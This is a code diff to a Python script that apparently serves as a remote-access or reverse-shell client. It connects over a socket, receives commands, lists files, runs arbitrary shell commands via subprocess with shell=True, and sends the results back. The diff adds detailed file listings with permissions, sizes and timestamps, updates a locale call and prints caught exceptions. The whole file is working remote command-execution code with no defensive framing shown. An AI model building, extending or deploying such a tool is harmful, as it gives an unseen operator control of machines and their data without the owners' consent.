@@ -1,4 +1,4 @@
-import subprocess ,socket, os, json, zlib, platform, locale
+import subprocess ,socket, os, json, zlib, platform, locale, stat, time
 
 try:
     s = socket.socket()
@@ -35,10 +35,16 @@ try:
                         result += '\n'.join(temp_result)
                         times += 1
                 else:
-                    temp_result = os.listdir()
-                    temp_result = ['f '+ s if os.path.isfile(s) else 'd '+ s for s in temp_result]
                     result += os.path.abspath('') + '\n'
-                    result += '\n'.join(temp_result)
+                    for filename in os.listdir():
+                        size = os.path.getsize(os.path.abspath(filename))
+                        status = os.stat(os.path.abspath(filename))
+                        auth = stat.filemode(status.st_mode)
+                        create_time = time.strftime('%y/%m/%d %H:%M:%S',time.gmtime(status.st_ctime))
+                        if status.st_nlink > 1:
+                            filename = filename + '->' + os.path.realpath(filename)
+                        temp_result = '{} {: >8} {} {}'.format(auth, size, create_time, filename)
+                        result += temp_result + '\n'
             elif COMMANDS[cmd] == 1:
                 path = os.path.abspath(args[0])
                 if not os.path.exists(path):
@@ -63,9 +69,10 @@ try:
                 if SYSTEM == 'Windows':
                     p = subprocess.run([*args], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                     if p.stdout:
-                        result += p.stdout.decode(locale.getdefaultlocale()[1])
+                        result += p.stdout.decode(locale.getlocale()[1])
                     else:
-                        result += p.stderr.decode(locale.getdefaultlocale()[1])
+                        result += p.stderr.decode(locale.getlocale()[1])
         s.sendall(result.encode())
-except:
+except Exception as e:
+    print(e)
     s.close()
